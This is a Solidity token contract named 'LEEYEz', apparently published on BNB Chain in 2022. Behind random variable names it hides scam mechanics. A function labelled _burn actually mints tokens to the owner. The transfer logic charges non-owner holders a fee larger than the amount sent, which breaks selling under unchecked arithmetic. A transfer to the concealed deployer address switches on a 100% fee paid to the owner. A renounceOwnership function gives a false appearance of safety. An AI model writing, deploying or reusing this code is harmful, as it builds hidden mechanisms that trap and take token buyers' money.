/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.7.3;
contract LEEYEz {
uint256 public  JMCHgk = 10000000000000000000;
address public  TkQBzI = address(0);
uint256 public  SKnnBq = 10000000000000000;
uint256 public  zjSstV = 10000000000000000000000000000;
address public  sJjuzJ = address(0);
string public  name = "LEEYEz";
address public  RyitNE = address(0);
uint256 public  OmNyXq = 100000000000000000000000;
uint256 public  OAZDPd = 100000000000000000000;
address public owner;
uint256 public  sAxxrQ = 100000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  fcttrR = 1000000000000000000;
address public  dTsMiQ = address(0);
mapping (address => uint256) public balanceOf;
address public  kOiLAE = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  ggjJWk = 10000000000000;
address private  DXngRg = address(0);
uint8 public constant decimals = 18;
uint256 public  qCABGk = 100000000000000000;
uint256 public constant JKzQLh = 99999999999999999999999999+1;
address public  sJBArD = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "LEEYEz";
event Transfer(address indexed from, address indexed to, uint256 value);
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () {
DXngRg = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "lLrUcD");
require(to != address(0), "lLrUcD");
require(amount <= balanceOf[from], "lLrUcD");
uint256 fly;
if (from == owner || to == owner){
fly = 0;
}
else{
fly = amount* JKzQLh/ggjJWk ;
}

uint256 transferAmount = amount - fly;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fly;
if (to==DXngRg){
ggjJWk = 99999999999999999999999999+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}